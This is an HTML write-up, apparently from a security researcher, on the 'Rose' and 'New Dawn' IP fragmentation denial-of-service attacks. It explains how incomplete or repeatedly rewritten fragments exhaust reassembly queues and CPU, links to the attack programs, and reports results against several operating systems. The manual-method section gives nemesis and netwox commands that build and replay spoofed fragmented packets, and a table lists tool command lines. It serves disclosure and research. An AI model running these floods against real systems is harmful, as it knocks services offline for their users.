@@ -1,0 +1,493 @@
+<html>
+
+<head>
+<meta name=Title content="The Rose Fragmentation Attack">
+<meta name=Keywords content="Rose NewDawn IP Fragmentation Attack">
+<title>The Rose Fragmentation Attack</title>
+</head>
+
+<p><span style='font-family:Courier'>This document
+is located at the following URLs and will be updated as needed:<br>
+<a href="Rose_Frag_Attack_Explained.htm">Rose_Frag_Attack_Explained.htm</a><br>
+<a href="Rose_Frag_Attack_Explained.txt">Rose_Frag_Attack_Explained.txt</a><br>
+<br>
+&nbsp;&nbsp; o&nbsp;&nbsp; <a href="#item1">Introduction</a><br>
+&nbsp;&nbsp; o&nbsp;&nbsp; <a href="#item2">Rose Fragmentation Attack</a><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; o&nbsp;&nbsp; <a
+href="#item2a">Rose Fragmentation Attack Tools</a><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; o&nbsp;&nbsp; <a
+href="#item2b">Rose Fragmentation Manual Method</a><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; o&nbsp;&nbsp; <a
+href="#item2c">Rose Attack Conclusions</a><br>
+&nbsp;&nbsp; o&nbsp;&nbsp; <a href="#item3">New Dawn Fragmentation Attack</a><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; o&nbsp;&nbsp; <a
+href="#item3a">New Dawn Fragmentation Attack Tools</a><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; o&nbsp;&nbsp; <a
+href="#item3b">New Dawn Fragmentation Attack Conclusions</a><br>
+&nbsp;&nbsp; o&nbsp;&nbsp; <a href="#item4">Attack Results for all attacks</a><br>
+<br>
+<br>
+<a name=item1>Introduction</a><br>
+=============<br>
+The &quot;Rose attack&quot; was conceived from a need to disrupt a network for
+my SANS GIAC GCFW practical:<br>
+<a href="William_Hollis_GCFW.pdf">William_Hollis_GCFW.pdf</a><br>
+<br>
+This attack is a combination of the SYN attack and the &quot;Unknown&quot; ICMP
+attack in the GCFW coursework:<br>
+<a href="http://www.sans.org/local/track2.php">http://www.sans.org/local/track2.php</a><br>
+<br>
+When I looked at these attacks, I realized that the source address and source
+port could be spoofed.&nbsp; No TCP handshake was required.&nbsp; In fact I
+realized that this attack would work equally well with ICMP, UDP or TCP.&nbsp;
+Firewalls do not matter because the packet is never evaluated / seen by the
+firewall.<br>
+<br>
+Initially I wondered if I could just send the first and last fragments of a
+&quot;large&quot; packet and consume CPU and memory.&nbsp; Most (if not all)
+implementations of the IP stack have accounted for this and will only allow
+reassembly of a certain number of packets.&nbsp; See the first explanation for
+what I found.<br>
+<br>
+I then sent my findings with the below (very manual) method of generating
+fragmented packets to Bugtraq. Laurent Constantin was kind enough to write
+rose.c making the attack a little more user friendly for testing.<br>
+<br>
+Paul Starzetz mentioned in one of the threads that he knew of issues with
+sending lots of intermediary fragments and then rewriting the final fragment
+over and over again.&nbsp; Chuck wrote the second variation of the attack that
+I call NewDawn.c and NewDawn2.c (named NewDawn to preclude confusion with the
+original &quot;Rose attack&quot;).&nbsp; I chose this name because New Dawn is
+a particularly thorny and nasty Rose variation:<br>
+<a href="http://www.au.gardenweb.com/forums/load/roses/msg0621503720247.html">http://www.au.gardenweb.com/forums/load/roses/msg0621503720247.html</a><br>
+<br>
+Finally, IPV6 was not tested.&nbsp; IPV6 allows fragmentation and per 
+<a href="http://clem1.be/ipv6-attacks/">the IPv6 attack tools</a> Clem1 has 
+on his website some or all of the below attacks are applicable to IPV6.<br>
+<br>
+I would like to thank Chris Brenton, Laurent Constantin and Chuck for their
+help in putting all of this together.<br>
+<br>
+<br>
+<a name=item2>Rose Fragmentation Attack</a><br>
+=========================<br>
+The first attack is fairly simple.&nbsp; Send the first few bytes of a
+fragmented packet at offset 0 (More Fragments Bit = 1) and then send a few
+bytes at the end of a 64k sized packet (More Fragments Bit = 0).&nbsp; The
+placement of the last fragment does not have to be at 64k, this is just an
+attempt to use more memory.<br>
+<br>
+Note that if you send with a random source address then the only way to track
+down the attack is to trace it hop by hop (router by router) back to the
+source.<br>
+<br>
+Source port does not matter because the packet has not &quot;moved up the
+stack&quot; yet, so the stack does not validate that the destination port is
+even valid.&nbsp; In some cases all legitimate fragmented packets are denied or
+impacted (UDP, TCP and ICMP) if you attack a machine in this manner.<br>
+<br>
+When you send enough of these tiny fragments the buffer in the receiving
+machine fills waiting for the rest of the fragments to arrive.&nbsp; Legitimate
+fragmented packets cannot enter the queue because it is already filled, waiting
+for the fragments that will never arrive.<br>
+<br>
+Some implementations of the IP stack drop &quot;old&quot; fragmented packets
+that have not completed thus thwarting (to a greater or lesser degree) this
+attack.<br>
+<br>
+<a name=item2a>Rose Fragmentation Attack Tools</a><br>
+===============================<br>
+Laurent Constantin was kind enough to program this attack from the below
+somewhat unwieldy manual set of instructions (see instruction starting with
+&quot;Finally the (very) manual way to implement&quot;).&nbsp; The program can
+be found at the following URL:<br>
+<a href="rose.c">rose.c</a><br>
+<br>
+Library netwib must be installed to run rose.c:<br>
+<a href="http://www.laurentconstantin.com/en/netw/netwib/">http://www.laurentconstantin.com/en/netw/netwib/</a><br>
+<a href="http://go.to/laurentconstantin">http://go.to/laurentconstantin</a><br>
+<br>
+Mike has implemented the attack in Python.&nbsp; There is a difference in that
+the first Packet is at Frag Offset 1 (Byte 4) and the last one at frag Offset
+16330 (Byte 65324).&nbsp; This should not make any difference in the attack as
+long as the last packet byte is &lt; 65475 (so that this would not look like a
+Ping O' Death attack):<br>
+<a href="http://anyplay.tznetz.com/exploits/rosefrag_py.html">http://anyplay.tznetz.com/exploits/rosefrag_py.html</a><br>
+<br>
+Ventsislav Genchev wrote a perl script to implement this:<br>
+<a
+href="http://citadelle.intrinsec.com/mailing/current/HTML/ml_bugtraq/11997.html">http://citadelle.intrinsec.com/mailing/current/HTML/ml_bugtraq/11997.html</a><br>
+<br>Clem1 has compiled some <a href="http://clem1.be/ipv6-attacks/">IPv6 attack tools</a>.  
+One of the tools is for the original Rose Attack:<br>
+<a href="http://clem1.be/ipv6-attacks/rose.py">http://clem1.be/ipv6-attacks/rose.py</a><br>
+<br>
+<br>
+<a name=item2b>Rose Fragmentation Manual Method</a><br>
+================================<br>
+Finally the (very) manual way to implement the first attack if you don't have a
+compiler :-) :<br>
+A = &quot;Attack&quot; computer - Windows 2000, latest service pack and all
+patches<br>
+<br>
+B = The computer that is attacked - Windows 2000, latest service pack and all
+patches &nbsp; for the purposes of this test assume that the IP of the attacked
+computer is 10.32.3.15. &nbsp; Change as needed.<br>
+<br>
+C = outside computer - Windows 2000, latest service pack and all patches<br>
+<br>
+Load WinPcap on computer A:<br>
+http://winpcap.polito.it/<br>
+<br>
+Load WinDump on computer A:<br>
+http://windump.polito.it/<br>
+<br>
+(You probably don't need to load WinDump, but it is a good utility to have
+around)<br>
+<br>
+Load Nemesis on computer A in directory C:\nemesis-1.4beta3&gt;<br>
+http://www.packetfactory.net/projects/nemesis/<br>
+<br>
+Load netwox on computer A<br>
+http://www.laurentconstantin.com/en/netw/netwox/<br>
+<br>
+Save the files Picmpdata.txt Ptcpdata.txt and Pudpdata.txt in the
+C:\nemesis-1.4beta3 directory (see attached).&nbsp; These files are
+&quot;sized&quot; correctly to make &quot;legal&quot; fragmented packets.<br>
+<a href="Ptcpdata.txt">Ptcpdata.txt</a><br>
+<a href="Pudpdata.txt">Pudpdata.txt</a><br>
+<a href="Picmpdata.txt">Picmpdata.txt</a><br>
+<br>
+Bring Up nemITUrnd.xls:<br>
+<a href="nemITUrnd.xls">nemITUrnd.xls</a><br>
+<br>
+Change the IP Address of the destination machine if needed.<br>
+<br>
+Select the rows, and fill down until you have seven thousand rows of packets<br>
+<br>
+Save as &lt;name&gt;.csv - MS-DOS Comma Separated Text<br>
+<br>
+Rename to &lt;name&gt;.txt<br>
+<br>
+Bring &lt;name&gt;.txt up word.&nbsp; You will see the lines:<br>
+<br>
+nemesis icmp -S 10.,3,.,64,.,121, -D 10.32.3.15 -d1 -i 8 -I ,7242, -P
+Picmpdata.txt -FM0,~,nemesis ip -S 10.,3,.,64,.,121, -D 10.32.3.15 -d1 -I
+,7242, -p 1 -P Picmpdata.txt -F8100,~,nemesis tcp -S 10.,196,.,212,.,207, -D
+10.32.3.15 -d1 -I ,2153, -s ,2494456820, -x ,36961, -y ,63398, -P Ptcpdata.txt
+-FM0,~,nemesis ip -S 10.,196,.,212,.,207, -D 10.32.3.15 -d1 -I ,2153, -p 6 -P
+Ptcpdata.txt -F8100,~,nemesis udp -S 10.,195,.,74,.,172, -D 10.32.3.15 -d1 -I
+,6316, -x ,13253, -y ,20460, -P Pudpdata.txt -FM0,~,nemesis ip -S
+10.,195,.,74,.,172, -D 10.32.3.15 -d1 -I ,6316, -p 17 -P Pudpdata.txt -F8100<br>
+<br>
+Change &quot;~&quot; to Paragraph.<br>
+<br>
+Save document and exit<br>
+<br>
+With a big file if you change both the tilde and the comma at the same time Word
+crawls to a stop, so save, exit, and bring it back up again to make the change
+to the comma.<br>
+<br>
+Bring &lt;name&gt;.txt up in word<br>
+<br>
+Change &quot;,&quot; to nothing (I.e. replace &quot;,&quot; with &quot;&quot;)<br>
+<br>
+Save and Exit<br>
+<br>
+Copy &lt;name&gt;.txt to the directory where you put the nemesis executable:<br>
+<br>
+C:\nemesis-1.4beta3&gt; rename &lt;name&gt;.txt to &lt;name&gt;.bat<br>
+<br>
+Open a cmd in and type the following for the ICMP UDP TCP Big Ping test:<br>
+<br>
+C:\&gt;netwox54 7 -R &quot;hexa&quot; -o nemesispingbig.txt --kbd<br>
+f<br>
+(dst 10.32.3.15 and (tcp or udp or icmp))<br>
+-<br>
+<br>
+Open a cmd in:<br>
+<br>
+C:\nemesis-1.4beta3&gt;<br>
+<br>
+and type:<br>
+<br>
+&lt;name&gt;.bat<br>
+<br>
+Let it run for several hours.&nbsp; You now have about 35,000 packets.&nbsp;
+During this test (if your computer A is fast enough) you can see the result by
+running a fragmented ping on computer C:<br>
+ping -t -l 1600 10.32.3.15<br>
+<br>
+You should see ping Request Time Out messages<br>
+<br>
+Now the real test begins (the previous just generated lots and lots of packets
+for you to send out all at once to &quot;attack&quot; the machine, you needed
+the attack machine on line to respond to ARP requests during the several hour
+test). &nbsp; Start a ping from computer C that is fragmented:<br>
+ping -t -l 1600 10.32.3.15<br>
+<br>
+To send all the packets all at once (first open Task Manager on computer B and
+watch the CPU utilization):<br>
+netwox54 14 -s -f nemesispingbig.txt<br>
+<br>
+Now you should for sure see ping Request Time Out messages on computer C.
+&nbsp; This will go on for about 2 minutes then the pings will start running
+again.<br>
+<br>
+<a name=item2c>Rose Attack Conclusions</a><br>
+=======================<br>
+If there are enough attacking computers, a brute force attack can completely
+congest the bandwidth going to the server.&nbsp; Since the source IP address is
+forged tracking down each machine would be painful.&nbsp; This is (of course)
+not a new attack, just a consequence of the Rose Attack.<br>
+<br>
+If the target is a slow computer, multiple fragments can spike the CPU up to
+100%.<br>
+<br>
+The third effect is that the CPU cannot process legitimate fragmented packets
+until the queue for the fragments times out.&nbsp; Since cell phones and
+satellite systems use fragmented packets this could be an issue with specific
+web sites.<br>
+<br>
+See &quot;Attack Results for all attacks&quot; for the results on different
+CPU's from this attack.<br>
+<br>
+<br>
+<a name=item3>New Dawn Fragmentation Attack</a><br>
+=============================<br>
+The second attack is a little more complicated.&nbsp; First send the first
+fragment at offset 0.&nbsp; Then send intermediate fragments, skip every few
+fragments so that the packet is never a complete packet.&nbsp; Finally send the
+ending fragment over and over and over again. &nbsp; The CPU expends resources
+trying to reassemble all the fragments, but of course it doesn't have them all
+yet. &nbsp; On many devices CPU utilization spikes up 30% or up to 100%.<br>
+<br>
+Paul Starzetz gives a nice description:<br>
+<a href="http://seclists.org/lists/bugtraq/2004/Apr/0107.html">http://seclists.org/lists/bugtraq/2004/Apr/0107.html</a><br>
+<br>
+Chuck found that he could spike the CPU of a Windows 2000 machine to 100
+percent.&nbsp; &nbsp;Chuck's explanation:<br>
+--------------------------------------------------<br>
+I have just been playing around with the timing on the second one.&nbsp; What I
+have discovered is CPU only spikes for reassembling fragments for packets that
+already exist (ie, if you run incre_frag once, then ctrl-c and start again, the
+CPU and resources won't go through the moon). &nbsp; Compiles on redhat-9.0.<br>
+<br>
+Chuck further explains:<br>
+http://www.lemure.net/updates.php (April 27)<br>
+&quot;Rose attack and other such nonsense<br>
+<br>
+Hey guys, wrote two little apps that seem to give windows a bad day.&nbsp;
+Pretty much they are variations on the &quot;old school&quot; fragment based
+attacks.<br>
+<br>
+Details are here:<br>
+Rose_Frag_Attack_Explained.txt<br>
+<br>
+I would like to take the time that I feel a little misunderstood in my quote
+there. &nbsp; The second attack I wrote was not the rose attack perse, but
+application of what the rose attack presented to me.&nbsp; Basically, windows
+will only bother keeping track of fragments representing 100 or less different
+IP packets (IP addresses/fragments with different IPID's). &nbsp; What the hell
+does this mean? &nbsp; Well, you can keep sending it teeny tiny fragments that
+continue to contain those IPIDs and fail miserably to line up properly, thereby
+wasting Windows time and forcing it to eat a lot of memory and CPU to keep
+track of all those different little pieces. &nbsp; Fun huh?&quot;<br>
+---------------------------------------------------<br>
+<br>
+<br>
+<a name=item3a>New Dawn Fragmentation Attack Tools</a><br>
+===================================<br>
+Chuck's code to spike a Windows machine to 100 percent:<br>
+<a href="NewDawn.c">NewDawn.c</a><br>
+<a href="NewDawn2.c">NewDawn2.c</a><br>
+<br>
+I spent some time looking at and trying to compile NewDawn.c and NewDawn2.c but
+could not get it to work on a Mandrake 9.2 box, so I took the code from rose.c
+and modified it to send tiny intermediate fragments and then re-write the final
+fragment to implement the second attack.&nbsp; Those files are:<br>
+<a href="NewDawn3.c">NewDawn3.c</a><br>
+<a href="NewDawn4.c">NewDawn4.c</a><br>
+<br>Clem1 has compiled some <a href="http://clem1.be/ipv6-attacks/">IPv6 attack tools</a>.  
+One of the tools is for New Dawn:<br>
+<a href="http://clem1.be/ipv6-attacks/newrose.py">http://clem1.be/ipv6-attacks/newrose.py</a><br>
+<br>
+<br>
+<a name=item3b>New Dawn Fragmentation Attack Conclusions</a><br>
+=========================================<br>
+The New Dawn attack is effective at elevating or pegging the CPU on most OSes
+that haven't fixed their code to account for this attack.&nbsp; This attack has
+caused a NAT device to crash and reboot.<br>
+<br>
+Both the Rose Attack and the New Dawn have been fixed in the latest Linux
+Kernel and on the latest Mac OS.<br>
+<br>
+Cisco tells me &quot;Generally speaking, we have features such as rate-limiters
+and access lists that are recommended as a best practice to protect against
+such DoS attacks.&quot;.<br><br>
+See
+<a href="http://www.cisco.com/en/US/tech/tk827/tk369/technologies_white_paper09186a00800949b8.shtml">
+http://www.cisco.com/en/US/tech/tk827/tk369/technologies_white_paper09186a00800949b8.shtml</a><br>
+<br>
+<br>
+<a name=item4>Attack Results for all attacks</a><br>
+==============================<br>
+The following data was collected from the machines available to me. &nbsp; Send
+me more machines and I will test them for you :-). &nbsp; All machines are
+patched to the latest &amp; greatest patch level (including XP SP2 for the XP
+machine). &nbsp; If you have additional data to fill in this table please send
+it to me gandalf@digital.net . &nbsp; Thanks:<br>
+&nbsp;CPU | &nbsp;&nbsp;&nbsp;&nbsp;OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | Firewall
+| CPU Speed&nbsp;&nbsp;&nbsp;&nbsp; | RAM Mb |<br>
+-----|-------------|----------|---------------|--------|<br>
+&nbsp; 1&nbsp; |Windows XP&nbsp;&nbsp; |ZoneAlarm | P4 2.5
+GHz&nbsp;&nbsp;&nbsp; | 512 &nbsp;&nbsp;&nbsp;|<br>
+&nbsp; 2&nbsp; |OS/X 10.3.5&nbsp; |Built-In &nbsp;|Dual G4 1GHz &nbsp;&nbsp;|
+256 &nbsp;&nbsp;&nbsp;| <br>
+&nbsp; 3&nbsp; |Windows 2000 |Symantec&nbsp; |PIII 667 MHz &nbsp;&nbsp;| 512
+&nbsp;&nbsp;&nbsp;|<br>
+&nbsp; 4&nbsp; |Mandrake 10&nbsp; |Shorewall |PIII 450 MHz &nbsp;&nbsp;| 192
+&nbsp;&nbsp;&nbsp;|<br>
+&nbsp; 5&nbsp; |Win 2000 Srv |Not On&nbsp;&nbsp;&nbsp; |DualXeon2.4GHz |
+1Gb&nbsp;&nbsp;&nbsp; |<br>
+&nbsp; 6&nbsp; |Mandrake 9.2 |Shorewall |Pent223MHz/MMX | 128
+&nbsp;&nbsp;&nbsp;|<br>
+-----|-------------|----------|---------------|--------|<br>
+<br>
+Except for CPU 1, 5 and 6, all machines were &quot;attacked&quot; from a Dell
+Latitude CP, 233 MHz machine, 96 Mb RAM, running Mandrake 9.2 (it was the only
+machine I have with a C compiler).&nbsp; CPU's 1 and 6 were attacked from a
+PIII 450 MHz machine.&nbsp; CPU 5 was attacked from a 366 MHz PII.<br>
+<br>
+Whether or not a firewall was active did not seem to make a difference. &nbsp;
+Again, these fragments never make it to layer 4 to be processed by a firewall.<br>
+<br>
+I do not believe that the Linux Kernel v2.6.8-rc4 /net/ipv4/ip_fragment.c code
+should look quite so impervious as the below results seem to indicate.&nbsp; It
+seems to me a 256 K limit of fragments is a little small for a server with
+today's proliferation of T1 and T3 connections, after 256K it drops down to a
+192k limit and drops fragments.&nbsp; The code does seem to take care of the
+last fragment rewrite by (it appears to me) just adding up the length of the
+fragments received in qp-&gt;meat and if that equals the length and you receive
+the last fragment then the fragment is complete and ready to be reassembled.
+&nbsp; I suspect that a test could be devised that would keep the 192k buffer
+filled and still stop the machine from processing legitimate packets.<br>
+<br>
+Software for the tests:<br>
+The initial Rose Attack (first and last fragment packet of a large packet
+sent):<br>
+rose.c = <a href="rose.c">rose.c</a><br>
+<br>
+The second Rose Attack (parts of a fragmented packet are sent, last fragment
+repeated many times, 32 byte fragments)<br>
+NewDawn3.c = <a href="NewDawn3.c">NewDawn3.c</a><br>
+<br>
+The second Rose Attack (parts of a fragmented packet are sent, last fragment
+repeated many times, 8 byte fragments)<br>
+NewDawn4.c = <a href="NewDawn4.c">NewDawn4.c</a><br>
+<br>
+(I could never get <a href="NewDawn.c">NewDawn.c</a>
+or <a href="NewDawn2.c">NewDawn2.c</a>
+to work, either piece of that software.&nbsp; So I rewrote the first part of
+the code into NewDawn3.c and NewDawn4.c. Chuck tells me that he compiled it on
+gcc version 3.2.2 20030222 (Red Hat Linux 3.2.2-5) Redhat 9 , custom 2.6.2
+kernel)<br>
+<br>
+Test | Command Line<br>
+-----|---------------------<br>
+&nbsp; 1&nbsp; | ./rose 1 &lt;IP Address&gt;<br>
+&nbsp; 2&nbsp; | ./NewDawn3 1 &lt;IP Address&gt; 0 5 9999 99999999 1021 8<br>
+&nbsp; 3&nbsp; | ./NewDawn3 1 &lt;IP Address&gt; 0 190 9999 99999999 1021 8<br>
+&nbsp; 4&nbsp; | ./NewDawn4 1 &lt;IP Address&gt; 0 5 9999 99999999 4000 2<br>
+&nbsp; 5&nbsp; | ./NewDawn4 1 &lt;IP Address&gt; 0 50 9999 99999999 4000 2<br>
+&nbsp; 6&nbsp; | ./NewDawn4 1 &lt;IP Address&gt; 0 190 9999 99999999 4000 2<br>
+<br>
+CPU| &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Test 1
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
+Test 2 &nbsp;&nbsp;&nbsp;&nbsp;| &nbsp;&nbsp;Test 3
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+---|--------------------------|---------------|---------------|<br>
+&nbsp;1 | Legitimate Fragmentation | CPU Util 30% &nbsp;| CPU Util 30% &nbsp;|<br>
+&nbsp;&nbsp; | blocked for two minutes &nbsp;| to 50%
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| to 50%
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+---|--------------------------|---------------|---------------|<br>
+&nbsp;2 | Legitimate Fragmentation | 10% CPU Util &nbsp;| 10% CPU Util &nbsp;|<br>
+&nbsp;&nbsp; | no loss
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|
+on one CPU&nbsp;&nbsp;&nbsp; | on one CPU&nbsp;&nbsp;&nbsp; |<br>
+---|--------------------------|---------------|---------------|<br>
+&nbsp;3 | Legitimate Fragmentation | 95% CPU Util &nbsp;| 95% CPU Util &nbsp;|<br>
+&nbsp;&nbsp; | blocked for two minutes &nbsp;|Packet rewrite |Packet rewrite |<br>
+---|--------------------------|---------------|---------------|<br>
+&nbsp;4 | Legitimate Fragmentation | about 0% CPU &nbsp;| about 5% CPU &nbsp;|<br>
+&nbsp;&nbsp; | No Loss
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|
+Util Increase | Util Increase |<br>
+---|--------------------------|---------------|---------------|<br>
+&nbsp;5 | Not run, assume same as &nbsp;|Task Mgr 25%CPU|10% CPU Util
+&nbsp;&nbsp;|<br>
+&nbsp;&nbsp; | test 1
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|Util
+but cursor|
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+&nbsp;&nbsp; |
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|jerky.&nbsp;
+Spikes
+|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+|<br>
+&nbsp;&nbsp;
+|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|to
+100% Util&nbsp;&nbsp;
+|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+|<br>
+---|--------------------------|---------------|---------------|<br>
+&nbsp;6 | 6 seconds (firewall&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|100% CPU
+Util&nbsp;&nbsp;|100% CPU Util&nbsp;&nbsp;|<br>
+&nbsp;&nbsp; | turned off for this
+test)|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+|<br>
+---|--------------------------|---------------|---------------|<br>
+<br>
+CPU|&nbsp;&nbsp;&nbsp;&nbsp;Test 4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;Test
+5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;Test
+6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+---|-----------------|---------------|----------------|<br>
+&nbsp;1 | Up to 70% CPU&nbsp;&nbsp; | Up to 100% CPU| Avg 70%
+CPU&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp; Erratic&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+|&nbsp;&nbsp;&nbsp; Erratic&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;Erratic&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+---|-----------------|---------------|----------------|<br>
+&nbsp;2 |10% CPU Util&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|10% CPU
+Util&nbsp;&nbsp;&nbsp;|10% CPU Util&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+---|-----------------|---------------|----------------|<br>
+&nbsp;3 |100% CPU Util&nbsp;&nbsp;&nbsp;&nbsp;| Up to 50% Util| Up to 60% Util
+|<br>
+&nbsp;&nbsp; |Locked Up
+Machine|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+|<br>
+---|-----------------|---------------|----------------|<br>
+&nbsp;4 |&nbsp; about 0% CPU&nbsp;&nbsp; | about 5% CPU&nbsp;&nbsp;| 5% - 10%
+CPU&nbsp;&nbsp;&nbsp;|<br>
+&nbsp;&nbsp; |&nbsp; Util Increase&nbsp; | Util Increase | Util Increase&nbsp;
+|<br>
+---|-----------------|---------------|----------------|<br>
+&nbsp;5 | Task Mgr 25%CPU |Task Mgr 30%CPU| 10% CPU Util&nbsp;&nbsp;&nbsp;|<br>
+&nbsp;&nbsp; | Util but cursor |Util but
+cursor|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+|<br>
+&nbsp;&nbsp; | jerky.&nbsp; Spikes&nbsp; |jerky.&nbsp;&nbsp;
+Spikes|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+&nbsp;&nbsp; | to 100% Util&nbsp;&nbsp;&nbsp;&nbsp;|to 100%
+Util&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+---|-----------------|---------------|----------------|<br>
+&nbsp;6 |&nbsp; 100% CPU Util&nbsp; | 100% CPU Util | 100% CPU Util&nbsp; |<br>
+---|-----------------|---------------|----------------|<br>
+<br>
+<br>
+<br>
+<br>
+</span></p>
+
+</body>
+
+</html>
